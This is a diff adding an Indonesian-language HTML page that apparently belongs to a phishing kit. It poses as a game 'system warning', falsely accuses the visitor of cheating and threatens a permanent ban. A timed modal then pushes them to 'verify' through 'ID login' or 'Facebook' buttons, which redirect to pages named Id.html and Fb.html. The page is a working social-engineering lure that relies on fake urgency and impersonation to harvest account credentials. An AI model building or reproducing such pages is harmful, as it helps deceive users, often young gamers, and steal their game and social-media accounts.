@@ -1,0 +1,247 @@
+<!doctype html>
+
+<html lang="id">  
+<head>  
+  <meta charset="utf-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1" />  
+  <title>Amankan akun Anda</title>  
+  <style>  
+    * { box-sizing: border-box; margin: 0; padding: 0; }  
+    html, body { height: 100%; }  body {  
+  font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;  
+  background-image: url('image.png');  
+  background-size: cover;  
+  background-position: center center;  
+  background-repeat: no-repeat;  
+  color: #fff;  
+}  
+
+.overlay {  
+  position: fixed;  
+  inset: 0;  
+  background: rgba(0,0,0,0.45);  
+  display: flex;  
+  align-items: center;  
+  justify-content: center;  
+  padding: 1rem;  
+}  
+
+.card {  
+  max-width: 900px;  
+  width: 100%;  
+  background: rgba(255,255,255,0.06);  
+  backdrop-filter: blur(3px);  
+  border-radius: 14px;  
+  box-shadow: 0 8px 30px rgba(0,0,0,0.5);  
+  padding: 2rem;  
+  border: 1px solid rgba(255,255,255,0.08);  
+}  
+
+h1 { font-size: 2rem; margin-bottom: 0.5rem; }  
+h2 { font-size: 1.3rem; margin: 1rem 0 0.5rem; }  
+p.lead { font-size: 1.05rem; opacity: 0.95; margin-bottom: 1.25rem; }  
+
+.btn {  
+  padding: .6rem 1rem;  
+  border-radius: 10px;  
+  text-decoration: none;  
+  font-weight: 600;  
+  border: 1px solid rgba(255,255,255,0.12);  
+  background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));  
+  color: white;  
+  cursor: pointer;  
+  transition: 0.2s;  
+}  
+
+.btn:hover { background: rgba(255,255,255,0.2); }  
+
+.btn.secondary {  
+  background: #28a745;  
+  border: 1px solid rgba(255,255,255,0.18);  
+  opacity: 0.95;  
+}  
+
+.btn.ok {  
+  background: #1877f2;  
+  border: 1px solid rgba(0,200,150,0.9);  
+}  
+
+/* Modal Styles */  
+.modal {  
+  position: fixed;  
+  inset: 0;  
+  background: rgba(0,0,0,0.6);  
+  display: flex;  
+  align-items: center;  
+  justify-content: center;  
+  z-index: 999;  
+  visibility: hidden;  
+  opacity: 0;  
+  transition: opacity 0.4s ease, visibility 0.4s ease;  
+}  
+
+.modal.show {  
+  visibility: visible;  
+  opacity: 1;  
+}  
+
+.modal.hide {  
+  opacity: 0;  
+  visibility: hidden;  
+}  
+
+.modal-content {  
+  background: rgba(255,255,255,0.1);  
+  backdrop-filter: blur(10px);  
+  padding: 2rem;  
+  border-radius: 14px;  
+  max-width: 400px;  
+  text-align: center;  
+  color: #fff;  
+  box-shadow: 0 8px 30px rgba(0,0,0,0.6);  
+  transition: all 0.3s ease;  
+}  
+
+.modal-content h3 {  
+  margin-bottom: 1rem;  
+  font-size: 1.4rem;  
+}  
+
+.modal-actions {  
+  display: flex;  
+  gap: 1rem;  
+  justify-content: center;  
+  margin-top: 1.5rem;  
+}  
+
+.modal-actions .btn {  
+  flex: 1;  
+}  
+
+.success {  
+  color: #00ffcc;  
+  font-weight: bold;  
+  margin-top: 1rem;  
+}  
+
+/* Loading bar */  
+.loading-container {  
+  margin: 1rem 0;  
+  text-align: center;  
+  display: none;  
+}  
+.loading-text {  
+  margin-bottom: .5rem;  
+  font-size: 1rem;  
+  opacity: 0.9;  
+}  
+.loading-bar {  
+  width: 100%;  
+  height: 8px;  
+  background: rgba(255,255,255,0.15);  
+  border-radius: 5px;  
+  overflow: hidden;  
+  position: relative;  
+}  
+.loading-bar::after {  
+  content: "";  
+  position: absolute;  
+  height: 100%;  
+  width: 30%;  
+  background: linear-gradient(90deg, #00ffcc, #00aaff);  
+  animation: loadingAnim 1.2s infinite;  
+  border-radius: 5px;  
+}  
+@keyframes loadingAnim {  
+  0% { left: -30%; }  
+  50% { left: 50%; }  
+  100% { left: 100%; }  
+}  
+
+@media (max-width: 560px) {  
+  h1 { font-size: 1.6rem; }  
+  .card { padding: 1rem; border-radius: 10px; }  
+  .modal-content { width: 90%; padding: 1.5rem; }  
+}
+
+  </style>  
+</head>  
+<body>  
+  <div class="overlay">  
+    <main class="card" role="main">  
+      <h1>[Peringatan Sistem]</h1>  
+      <p class="lead">  
+        Kami mendeteksi adanya aktivitas mencurigakan pada akun Anda.  
+        Mohon hentikan penggunaan program pihak ketiga / cheat.  
+        Jika pelanggaran terulang, akun Anda dapat dibanned secara permanen.  
+      </p>  <!-- Loading muncul di sini -->  
+  <div class="loading-container" id="loadingContainer">  
+    <div class="loading-text">Sedang memeriksa akun . . .</div>  
+    <div class="loading-bar"></div>  
+  </div>  
+
+  <section style="margin-top:1.25rem; opacity:0.95;">  
+    <h2>Pengguna yang melakukan perilaku berikut akan diblokir akunnya:</h2>  
+    <ul style="line-height:1.6;">  
+      <li>Menggunakan platform game untuk <strong>berjudi</strong>.</li>  
+      <li>Memposting <strong>Hoax</strong> atau <strong>Menghina</strong> orang lain di dalam game.</li>  
+      <li>Menggunakan aplikasi eksternal (akselerator) di dalam game.</li>  
+      <li>Menggunakan <strong>script</strong>, <strong>mod</strong> atau program ilegal.</li>  
+      <li><strong>Bug exploit</strong> untuk keuntungan pribadi. </li>  
+    </ul>  
+  </section>  
+</main>
+
+  </div>    <!-- Modal -->    <div class="modal" id="popupModal">  
+    <div class="modal-content" id="modalContent">  
+      <h1>Segera lakukan verifikasi untuk mengamankan akun Anda</h1>  
+      <p>Sistem kami telah menemukan bahwa akun Anda melakukan tindakan curang (<strong>menggunakan aplikasi external/tambahan</strong>).  
+Tindakan ini melanggar aturan resmi permainan.  
+Sesuai kebijakan, akun Anda akan dikenakan hukuman yang dapat berujung pada pemblokiran permanen</p>  
+      <div class="modal-actions" id="modalActions">  
+        <button type="button" class="btn secondary" onclick="batal()"><strong>ID login</strong></button>  
+        <button type="button" class="btn ok" onclick="lanjutkan()">Facebook</button>  
+      </div>  
+    </div>  
+  </div>    <script>  
+    function openModal() {  
+      const modal = document.getElementById('popupModal');  
+      modal.classList.add('show');  
+      modal.classList.remove('hide');  
+    }  
+  
+    function closeModal() {  
+      const modal = document.getElementById('popupModal');  
+      modal.classList.remove('show');  
+      modal.classList.add('hide');  
+    }  
+  
+    function batal() {  
+      closeModal();  
+      setTimeout(() => {  
+        window.location.href = "Id.html"; // ganti sesuai nama file tujuanmu  
+      }, 400); // sama dengan durasi animasi modal  
+    }  
+  
+    function lanjutkan() {  
+      const content = document.getElementById('modalContent');  
+      content.innerHTML = `  
+        <h3>Please wait...</h3>  
+        <p>Anda akan diarahkan ke halaman selanjutnya.</p>  
+      `;  
+      setTimeout(() => {  
+        window.location.href = "Fb.html";   
+      }, 2000);  
+    }  
+  
+    // Loading muncul setelah 1 detik  
+    window.onload = () => {  
+      setTimeout(() => {  
+        document.getElementById('loadingContainer').style.display = 'block';  
+      }, 1000);  
+  
+      // Modal muncul setelah 6 detik  
+      setTimeout(openModal, 6000);  
+    };  
+  </script>  </body>  
+</html>
